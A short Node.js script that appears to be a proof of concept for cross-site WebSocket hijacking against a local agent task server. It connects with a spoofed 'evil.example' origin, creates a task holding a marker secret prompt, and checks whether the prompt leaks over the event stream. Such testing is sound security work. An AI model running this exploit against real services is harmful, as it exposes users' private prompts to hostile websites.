const WebSocket = require(process.cwd() + '/node_modules/ws');
const ws = new WebSocket('ws://127.0.0.1:18799/ws/events', { origin: 'https://evil.example' });
let n = 0;
ws.on('open', async () => {
  console.log('OPEN accepted with evil origin');
  const r = await fetch('http://127.0.0.1:18799/api/tasks', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ prompt: 'SECRET_PROMPT_123', agentId: 'claude', workflow: 'manual' }) });
  console.log('create status', r.status);
});
ws.on('message', (d) => { n++; const s = d.toString(); if (n < 6) console.log('MSG', s.slice(0, 200)); if (s.includes('SECRET_PROMPT_123')) console.log('LEAK: prompt observed'); });
ws.on('error', (e) => console.log('ERR', e.message));
ws.on('unexpected-response', (req, res) => console.log('REJECTED', res.statusCode));
setTimeout(() => { console.log('total msgs', n); process.exit(0); }, 5000);
